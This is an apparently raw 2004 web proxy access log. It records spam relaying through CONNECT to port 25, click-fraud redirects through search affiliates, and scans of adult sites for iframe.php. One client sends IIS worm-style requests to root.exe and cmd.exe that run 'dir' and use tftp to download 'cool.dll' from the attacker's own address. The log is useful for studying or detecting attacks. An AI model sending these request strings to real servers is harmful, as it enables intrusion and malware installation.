IP	Ident	Userid	Timestamp	Timezone	HTTP_Request	HTTP_Status	HTTP_Duration	HTTP_Referer	Browser_Type
61.237.215.17	-	-	[10/Mar/2004:01:28:24	-0500]	GET http://mine-seek.com/search_results.php?fSearch_id=f6894e70cead410e&fString=sales HTTP/1.0	200	15413	http://www.linkou.con.cn	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
61.237.215.17	-	-	[10/Mar/2004:01:28:29	-0500]	GET http://mine-seek.com/redirect.php?fID=2862149 HTTP/1.0	302	0	http://mine-seek.com/search_results.php?fSearch_id=f6894e70cead410e&fString=sales	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
203.121.182.144	-	-	[10/Mar/2004:01:28:37	-0500]	CONNECT 200.59.32.194:25 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[10/Mar/2004:01:29:06	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
61.172.244.109	-	-	[10/Mar/2004:01:29:07	-0500]	CONNECT 209.15.20.239:25 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[10/Mar/2004:01:29:09	-0500]	GET http://www.ushockeynews.com/iframe.php HTTP/1.0	404	1203	http://www.ushockeynews.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
192.117.242.67	-	-	[10/Mar/2004:01:29:11	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
203.121.182.142	-	-	[10/Mar/2004:01:29:23	-0500]	CONNECT 166.114.250.146:25 HTTP/1.0	500	436	-	-
24.235.131.196	-	-	[10/Mar/2004:01:29:56	-0500]	GET http://www.victoriagivens.com/iframe.php HTTP/1.0	404	204	http://www.victoriagivens.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:29:58	-0500]	GET http://www.vgirl.com/iframe.php HTTP/1.0	302	200	http://www.vgirl.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:30:13	-0500]	GET http://www.vailspage.com/iframe.php HTTP/1.0	404	592	http://www.vailspage.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:30:31	-0500]	GET http://www.virginsclub.com/iframe.php HTTP/1.0	302	287	http://www.virginsclub.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:30:42	-0500]	GET http://www.visualsex.com/iframe.php HTTP/1.0	404	461	http://www.visualsex.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:30:50	-0500]	GET http://www.virginz.com/iframe.php HTTP/1.0	404	518	http://www.virginz.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:31:20	-0500]	GET http://www.voyeurscene.com/iframe.php HTTP/1.0	404	395	http://www.voyeurscene.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
12.221.212.151	-	-	[10/Mar/2004:01:31:45	-0500]	HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0	200	0	http://www.sapphicerotica.com/members/index.html	Mozilla/4.0 ( compatible; [de]; Windows 98; ezn IE )
12.221.212.151	-	-	[10/Mar/2004:01:31:45	-0500]	HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0	200	0	http://www.sapphicerotica.com/members/index.html	Mozilla/4.0 ( compatible; [jp]; Windows 98; DigiExt )
192.117.242.67	-	-	[10/Mar/2004:01:31:52	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[10/Mar/2004:01:32:34	-0500]	GET http://www.wetlesbians.com/iframe.php HTTP/1.0	302	0	http://www.wetlesbians.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:33:11	-0500]	GET http://www.wives-amateur-sex.com/iframe.php HTTP/1.0	404	30610	http://www.wives-amateur-sex.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
203.121.182.140	-	-	[10/Mar/2004:01:33:34	-0500]	CONNECT 200.170.34.57:25 HTTP/1.0	500	434	-	-
192.117.242.67	-	-	[10/Mar/2004:01:34:07	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[10/Mar/2004:01:34:07	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[10/Mar/2004:01:34:17	-0500]	GET http://www.xss.com/iframe.php HTTP/1.0	404	2118	http://www.xss.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
61.237.215.17	-	-	[10/Mar/2004:01:34:35	-0500]	GET http://eyesontheworldwideweb.com/search.php?ID=44&fString=Sales HTTP/1.0	302	0	http://www.linkou.con.cn	Mozilla/4.5 [en] (Win98; I)
61.237.215.17	-	-	[10/Mar/2004:01:34:43	-0500]	GET http://eyesontheworldwideweb.com/redirect.php?fID=7162258 HTTP/1.0	302	0	http://eyesontheworldwideweb.com/search_results.php?fSearch_id=74d1a99f2e279e91&fString=sales	Mozilla/4.5 [en] (Win98; I)
68.48.142.117	-	-	[10/Mar/2004:01:35:01	-0500]	GET /scripts/root.exe?/c+dir HTTP/1.0	200	566	-	-
24.235.131.196	-	-	[10/Mar/2004:01:35:17	-0500]	GET http://www.xxxmovievault.com/iframe.php HTTP/1.0	302	232	http://www.xxxmovievault.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:35:22	-0500]	GET http://www.xxxrookies.com/iframe.php HTTP/1.0	404	295	http://www.xxxrookies.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:35:38	-0500]	GET http://www.xxxhouston.com/iframe.php HTTP/1.0	404	14151	http://www.xxxhouston.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
212.160.136.163	-	-	[10/Mar/2004:01:35:41	-0500]	GET http://www.blowsearch.com/r.php?mc=39506667=qvohfAAA5252822626110981211=DAHAAA24850535=qvxpvypAAAgangyhfabp=lerhdAAA05284865=qvAAA2=qvrAAA81DDD1=qvoAAAnefekenkgmyauoyatotacobaaotauo=qvgAAA5118=abvgvfbc?ybbpDDDuthbeugxpvyp/zbpDDDryqbbanxDDDjjj//CCCcgguCCCCCCMMM112CCCCCC931DDD1CCCCCCgangyhfabpCCCCCC9161109812OOO1377118308OOO012DDD712DDD95DDD97CCCCCC9125109812CCCCCC012DDD712DDD95DDD97CCCCCCehgenCCCCCC]ryqbbanX[CCCCCC1377118308&v=5f23d1932a94ef0c18761e8607680bd7 HTTP/1.0	302	2	http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant	Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)
212.160.136.163	-	-	[10/Mar/2004:01:35:45	-0500]	GET http://www.kanoodle.com/clickthrough.cool?position=7004&tid=bhngbnnobpngbgnlbhnlztxarxrsra&bid=0.07&eid=1&id=45737149&query=consultant&clickid=42494731&UNQ=0010789005151171414&subid=65559482 HTTP/1.0	301	329	http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant	Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)
212.160.136.163	-	-	[10/Mar/2004:01:35:48	-0500]	GET http://www.yoomy.com/Go.php?Record=5466416&yo=6c39f2eff1db317cea9fee5ec33113d9 HTTP/1.0	302	0	http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search	Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)
212.160.136.163	-	-	[10/Mar/2004:01:35:51	-0500]	GET http://partners.mygeek.com/presults.jsp?partnerid=98683&vendorId=97087&type=1&code=0&rate=725362362&cr=725362362&domain=www.franchisegator.com&query=1078900546227%3A%3A192.168.1.103%3A%3Achildren&url=http%3A%2F%2Fwww.looksmart.com%2Fog%2Fpr%3DPsr%3Bro%3D3%3Brc%3D4%3Bla%3D183188%3Blm%3D82675%3Bli%3D102572757%3Bed%3D20040126%3Bii%3D8070.1d5b.404ea7fe.6b32%3Bpn%3D%3Bto%3D%3Btc%3D4%3Bpo%3D3%3Bpc%3D4%3Bpi%3Dlzd%3Bts%3D%7Chttp%3A%2F%2Fwww.franchisegator.com%2Fcgi-bin%2Fprofile.php%3Fkey%3D36%26f_type%3D9 HTTP/1.0	302	482	http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search	Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)
212.160.136.163	-	-	[10/Mar/2004:01:35:51	-0500]	GET http://leadership-international.org/?source=kanoodle HTTP/1.0	200	17183	http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant	Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)
68.48.142.117	-	-	[10/Mar/2004:01:35:51	-0500]	GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[10/Mar/2004:01:35:51	-0500]	GET /scripts/httpodbc.dll HTTP/1.0	404	288	-	-
212.160.136.163	-	-	[10/Mar/2004:01:35:52	-0500]	GET http://www.looksmart.com/og/pr=Psr;ro=3;rc=4;la=183188;lm=82675;li=102572757;ed=20040126;ii=8070.1d5b.404ea7fe.6b32;pn=;to=;tc=4;po=3;pc=4;pi=lzd;ts=%7Chttp://www.franchisegator.com/cgi-bin/profile.php?key=36&f_type=9 HTTP/1.0	302	249	http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search	Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)
24.235.131.196	-	-	[10/Mar/2004:01:36:03	-0500]	GET http://www.youngflasher.com/iframe.php HTTP/1.0	404	26224	http://www.youngflasher.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
218.68.219.92	-	-	[10/Mar/2004:01:36:07	-0500]	GET http://www.searchpat.com/cgi-bin/sf.cgi?t=f7&keys=zhhvzhahanhazfhyacsxhvadsoamhszszyzszczxzsayayzxzxznsfaahdananakhaasssacamadaaaoazsshisizshaavszsshvaisizssaspavzzzszpsxahahaiaazoazsdzvskzxzmscspzosmsasihczzhzzczfznsxsysyzkahsoaxsaaszxzazzhvsxaksysdsfzisaspavhdzxzszyzizdzkzyazayzxzyzhhzzyhszihfzazxhffazzhsdfdnddzdzzhfzoazavzfzhfzhxhdavsoapsssaamsszazxhdsmsmazanafaazazvsazczxhazzzoskshsvavasshfczchdahaksxakadzyahsozdzxzfhxzhhszihhfazzzxsasazdzzhizpfzzhhfsnhahpzazzhshfzxzczmddzdhfadscanzdzzhiaiasaoaiaxzihvaissanshaxaiazsaaasdsoszacacavamapazavsdanhfzxfczhhsahsssyzohshhzchfzszsfzzhhiapaxssassyzazpazfhzczasyspavafhksfacanahassdaksdshsssksvxzaphfsiaxazhnapsfadafahsdaksyhmaiadaafczzhffpahsodvzhhssxaasyskhyaxaaassaziacsiaxhoavandoahzcccandiznsmschdananakhahszszxzxhmznzphnszsksnzhzpacanfohvsfsvsvhvadsosihcsxamanspznshzczszvaxxpfxzmszafayapzssaspavzzzxzfzzzhzzsysdshznsihxzoavszddzmzzhozpzizdzyhdhkzszfhnzyzohphvzoapzszysfzmsisaakzkaxsxsfakssssaasdsxzzfpfdhszfzpaxsczxzmszafav&kw=health+insurance HTTP/1.0	302	692	http://www.searchpat.com/cgi-bin/smartsearch.cgi?username=discovery&keywords=Health+Insurance	Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90)
218.68.219.92	-	-	[10/Mar/2004:01:36:09	-0500]	GET http://66.77.183.152/Search?fig=3157&evid=CE0070c3faac&eng=Kanoodle-11-2002&cb=WbAnyWay&dest=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Fposition%3D7001%26tid%3Dbhngbnnobpngbgnpbgnnzixdxaxxrt%26bid%3D0.16%26eid%3D1%26id%3D77833714%26query%3Dhealth%2520insurance%26clickid%3D35134%26UNQ%3D00107890090736959491&engid=1708&gid=5663&af=0&qtype=0&qw=health+insurance&ts=1078900549&cs=99ad0/2 HTTP/1.0	302	389	http://www.searchpat.com/cgi-bin/smartsearch.cgi?username=discovery&keywords=Health+Insurance	Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90)
24.235.131.196	-	-	[10/Mar/2004:01:36:39	-0500]	GET http://www.zipcontent.com/iframe.php HTTP/1.0	403	4126	http://www.zipcontent.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
68.48.142.117	-	-	[10/Mar/2004:01:36:42	-0500]	GET /MSADC/root.exe?/c+dir HTTP/1.0	200	566	-	-
24.235.131.196	-	-	[10/Mar/2004:01:36:46	-0500]	GET http://www.zillah.com/iframe.php HTTP/1.0	404	275	http://www.zillah.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[10/Mar/2004:01:36:50	-0500]	GET http://www.zlan.net/iframe.php HTTP/1.0	302	0	http://www.zlan.net/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
192.117.242.67	-	-	[10/Mar/2004:01:36:55	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
12.221.212.151	-	-	[10/Mar/2004:01:36:59	-0500]	HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0	200	0	http://www.sapphicerotica.com/members/index.html	Mozilla/4.0 ( compatible; [jp]; Windows XP; DigiExt )
12.221.212.151	-	-	[10/Mar/2004:01:37:00	-0500]	HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0	200	0	http://www.sapphicerotica.com/members/index.html	Mozilla/4.6 ( compatible; [en]; Windows XP; MSNIA )
24.235.131.196	-	-	[10/Mar/2004:01:37:20	-0500]	GET http://www.x-mates.com/iframe.php HTTP/1.0	502	531	http://www.x-mates.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
68.48.142.117	-	-	[10/Mar/2004:01:37:32	-0500]	GET /MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[10/Mar/2004:01:37:32	-0500]	GET /MSADC/httpodbc.dll HTTP/1.0	404	286	-	-
24.235.131.196	-	-	[10/Mar/2004:01:37:34	-0500]	GET http://www.xs-kontakt.com/iframe.php HTTP/1.0	502	537	http://www.xs-kontakt.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
61.172.244.232	-	-	[10/Mar/2004:01:37:54	-0500]	CONNECT 209.15.20.155:25 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[10/Mar/2004:01:38:11	-0500]	GET http://www.2002springbreak.com/php/iframe.php HTTP/1.0	404	10	http://www.2002springbreak.com/php/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
68.48.142.117	-	-	[10/Mar/2004:01:38:22	-0500]	GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.219.193.6	-	-	[10/Mar/2004:01:38:25	-0500]	GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.1	200	2219	http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
68.219.193.6	-	-	[10/Mar/2004:01:38:25	-0500]	CONNECT 192.168.1.103:80 HTTP/1.1	400	381	-	-
24.235.131.196	-	-	[10/Mar/2004:01:38:34	-0500]	GET http://www.3exclm-free-hardcore-mature-milf-granny-sex-porn-pussy-pics.com/php/iframe.php HTTP/1.0	302	351	http://www.3exclm-free-hardcore-mature-milf-granny-sex-porn-pussy-pics.com/php/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
192.117.242.67	-	-	[10/Mar/2004:01:39:01	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[10/Mar/2004:01:39:01	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[10/Mar/2004:01:39:05	-0500]	GET http://www.young-celebs.com/iframe.php HTTP/1.0	502	541	http://www.young-celebs.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.201.201.176	-	-	[10/Mar/2004:01:39:12	-0500]	GET http://www.ropile.com/index.php?q=NVDbSsUwEPwVCZgXaU+ubZJDEBEE3/2BPWmq4fQSk1YU8d9NW4UEdmdmh9kFo8x3NtygHDp0zqY1iGspCSVbJw16X3362mpaqOcprwkm528e5zHCtBPMoBB3RbFpVC1UTUlTvt5AYZDvD+8ipDtWdJcN6gypCaGyQMqgNfs0wej/pgQMAzoYNwR3XdPeMlps3pYlmtPpA3am9jEM81K7eTwdAOT4eX+14T/unTvi4ovlhOBojwmcbZpL5XGcs+V4sUzga+is6LiQkqmqYRQq4XpZadk3lVBC90oRwfsL9tEyXM5muXai7RtfQdsVDSO0AuBQ6V4qAMk7ojUe7B76lj2V9zD6FBxML37wrwnGLfq2XFOO9RlDKjcIhpJWaUK50OefXw== HTTP/1.1	302	0	http://www.ropile.com/	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
68.48.142.117	-	-	[10/Mar/2004:01:39:12	-0500]	GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
24.201.201.176	-	-	[10/Mar/2004:01:39:12	-0500]	GET http://vaclick.epilot.com/click.aspx?k=insurance+company&b=300&p=epilot&s=ropile&pos=3&t=24&kid=4d345528-621a-4cf5-95f6-4849f88043fb&ep=2&sid=39c47f6e-a7d6-4201-aa3a-9f58aa53d099&l=http:%2F%2FAmericanTelegram.com HTTP/1.1	302	271	http://www.ropile.com/	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.121.182.144	-	-	[10/Mar/2004:01:39:44	-0500]	CONNECT 198.65.164.28:25 HTTP/1.0	200	-	-	-
61.237.215.17	-	-	[10/Mar/2004:01:39:53	-0500]	GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0	200	2038	-	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
212.160.136.163	-	-	[10/Mar/2004:01:39:58	-0500]	GET http://www.searcheaven.net/cgi-bin/smartsearch/sf.cgi?t=xm&keys=sfadazsnaispacsksozpzcsxskaxazshavavssadapzpahsphvscspaahfafsihhhmsmszsvhnaasosshnaohozchzanshssakaihzsaavzyzczyanadssafahanaascaizmsnaszzszsfacapaasmhxzoaisiszhnakzzaxavassaamzszyaxahahaascshzdzyadaaszsizdsaaashshanzvzzaisoaxscshafsasoaszmzcsaassvsdaoavszsksyzvzaazafszazacafapasanzhzhaasmafsnshspapsoadzahsaiayaxadacsvapafanhxhospanszsmshavahacsnzazcaisyszayacacapsoanzvzcsaassysmssafsashafzazdaiaxaxahsaaasxsoadzhhosfadapsnakspsaacsozphvsdassyahacaoapahashczksdadafasamafansoskzazkaisnsiskacavavacsohchmsnsyaxasaaskshskschzhfazscszaysaaiafsyanhyzcszansysdshaaanshaszazpazasaaahaksisxsksmzpzksxasadsmsdsksfshschfzmsdafaasdsdadavsysozvzcasassdsmadskaososchfzzsasnadscacsxapsoanhahvsaassssnaoskayskaihczdsascadazacafsashsohczcaaasaxazsnaaafshsnzazvazskadsvsdadshsssyzphmadasazazaiavapacsohzhmazaiszadsaafsxafanhchosxassksdsdsiaysoafzahmsdaoadsmsaspshavsozihmsxsoapsmscaaahsoanhfhmsxafsyahsdakshavanzpzcadsyadacsdsiafacsnhchnsasoaaazaksisxsasohzhoavasszazsdskayshaszvhmsdahadskacakafasanzihoaiansvsmakaaaoafsnhzhfaysosyacaksiapahsyhozhayasszacspafsfacskzvzvaiaoaxayaospapsnsmzphoassyapacacsiaysoadhfzhaianaxscacacapacsyzkhvayanafsmaosisisoaxhzzzaismsysxakacshsnsyhzzcszanaxazaiskafafsozahksasmadadacadshadsohfzcsxassssdaoavafafsyhzzvsasosiacaksxsxshsozmzcsdansyacamavavsoashchoayasszsnaksxavsnsmhxhvsdsmafsdakaasishadhczpayaxaxsmsdsysaadadzizcsnsoazacakaaaoacsyhzzcazscaaasacadshacadhazkasansvsdshaasishadzvzkazsksiahsasyshahsozhhvsfassmsmscspanshaszahmazsnsiszacspavavadzizkakansksnaaspsishahzahvsaahaxsmakaasxspadzchoazsyssasscspapsosyzphnaysnsisxsdsyshahsyzzzcaaasszsmakafsfafaszvhfsxsosyadakaaavspsmhchoassoaaacspspsxacafzphmsxsnaxsxaospsashsmhxhosasmsmasafafahacsnzpzpsxaxaasdsaspshssadzmzhaismszsnsdafsxacanzphmayasaxscshaksaavsmhozhavsmaaasscspapacaohfahspzasaasadhaaaaasmzszphoszssahhksoaisfsizkhpaxsxanskhyhszkssavzshozysxsxsohcsmahahschxzpsnaahydzfchvzzhfzksvanzysyazsp&kw=auto+parts HTTP/1.0	302	1169	http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts	Mozilla/4.75 [en] (WinME; I)
68.48.142.117	-	-	[10/Mar/2004:01:40:02	-0500]	GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
212.160.136.163	-	-	[10/Mar/2004:01:40:03	-0500]	GET http://xmlrevenue.com/other.php?k=hphahihfhxzmhmhnhphazfzshfzfzshazyzpdhdsfvhozihnzohvhfhchshhzohihfzyhfhmfffohdhvzaaizfhmaadizaasapapdidcfoaizczdaahihodshnzvfaaahxfdsxskhnzysysxzmzhsnaisfsasyhiavacdofidcdcacssazskahsxsosizhdyshfksafdhvaafifmaxzchcfahvzodzskaaschddchxzkazsazhdaazsxfzsdayfsfkafaffnfddsszsoahahfcdysidhfisfdsdydhsiafdxdvaozhayfvakfzacszdvdhavsphsazhzaxfsfkdohzhxahzmhpanachizmfsazzmdiafafzfzmfidvaaaxsahxsfsnsxdxdfaasxdfdsaxhffoffadfffcdihsfffddnazsmdnfczyhfhsanaiakfhfxfmdhdadpdfsyaxffsyahhdsdfzdisosfffhasydianfzdpdyfydcsnsissakdhapadfshzsddkfxdozxdzzoafdisaakspdifyhkavdpanaoaafyzyfsfydphksidfadahszhzffacfasosasyahszsiaksyspdmsksmfkzddnhhdmfdfhzssxaiasscayzxhczdsdaiaosczaddzfhhhazkzchozafadchvaxsyshzcazafaasaavsmsdaasihnshasskhcsdaisihnakszaahhzchpzosfazsdsysvadzcszsxafayaahzhphfayassdad&u=search123&a=searcheaven&keywords=auto%20parts&gen=xmlfeed&gto=zpzshdhchazfzohyzizc HTTP/1.0	302	0	http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts	Mozilla/4.75 [en] (WinME; I)
212.160.136.163	-	-	[10/Mar/2004:01:40:04	-0500]	GET http://click.search123.com/cgi-bin/clickthru.cgi?EI=53503&Q=auto%20parts&NGT=Z8BzwYitxjrfxidVpL5odqAq+NAS+KzhzNk8XXiigTf+C0NBXk5SjzVihjvCXUSYzTa7ShdGDk2fxHxtTNCFBCLivp14+DQpnPOQ4XMWsLY4fTAbqVInyh+vowKW/5amV0hS/+wc/0g10WEUo/h6aaVDdzRkZu9hYYfwDUYwLAzLOovrdXOAirEUwkRncS9vn56C7dzsN68T21xPLw8RrLlJ0jyndluupZJWLnr4mmpmy27bm49upG+lG29I9+z+3tYCKzsk4Tc=&x=1&IP=192.168.1.103&UID=39593 HTTP/1.0	302	361	http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts	Mozilla/4.75 [en] (WinME; I)
212.160.136.163	-	-	[10/Mar/2004:01:40:05	-0500]	GET http://www.looksmart.com/og/pr=Psr;ro=5;rc=7;la=30183;lm=84862;kw=3143084;ed=20031223;ii=8072.6d3d.404eb829.6f9b;pn=;to=;tc=7;po=5;pc=10;pi=pza4;ts=%7Chttp://www.racing-seats-usa.com/ HTTP/1.0	302	212	http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts	Mozilla/4.75 [en] (WinME; I)
212.160.136.163	-	-	[10/Mar/2004:01:40:06	-0500]	GET http://www.racing-seats-usa.com/ HTTP/1.0	200	9283	http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts	Mozilla/4.75 [en] (WinME; I)
61.237.215.17	-	-	[10/Mar/2004:01:40:27	-0500]	GET http://99seek.com/search.php?ID=107&fString=Car+Rentals HTTP/1.0	302	0	http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm	Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)
61.237.215.17	-	-	[10/Mar/2004:01:40:28	-0500]	GET http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals HTTP/1.0	200	6548	http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm	Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)
61.237.215.17	-	-	[10/Mar/2004:01:40:30	-0500]	GET http://99seek.com/redirect.php?fID=10597268 HTTP/1.0	302	0	http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals	Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)
61.237.215.17	-	-	[10/Mar/2004:01:40:31	-0500]	GET http://xml.seek99.com/go2.htm?a=%CB%9D%C3%19U&bid=aascaaafaxaz&url=http%3A%2F%2Fpartners.mygeek.com%2Fpresults.jsp%3Fpartnerid%3D98607%26vendorId%3D82212%26type%3D5%26code%3D1%26rate%3D543362362%26cr%3D543362362%26domain%3Dwww.2020search.com%26query%3D1078900826570%253A%253A66.70.88.60%253A%253Acar%2Brentals%26url%3Dhttp%253A%252F%252Fwww.2020search.com%252Ftoolbar%252Finstall.html%253FKeywords%253Dcar%252520rentals&valsearch=1 HTTP/1.0	200	566	http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals	Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)
68.48.142.117	-	-	[10/Mar/2004:01:40:52	-0500]	GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[10/Mar/2004:01:40:53	-0500]	GET /c/httpodbc.dll HTTP/1.0	404	282	-	-
24.235.131.196	-	-	[10/Mar/2004:01:40:58	-0500]	GET http://www.youngvagina.com/iframe.php HTTP/1.0	502	539	http://www.youngvagina.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
68.48.142.117	-	-	[10/Mar/2004:01:41:43	-0500]	GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[10/Mar/2004:01:41:51	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
12.221.212.151	-	-	[10/Mar/2004:01:41:51	-0500]	HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0	200	0	http://www.sapphicerotica.com/members/index.html	Mozilla/4.0 ( compatible; MSIE 5.5; Windows 98; DigiExt )
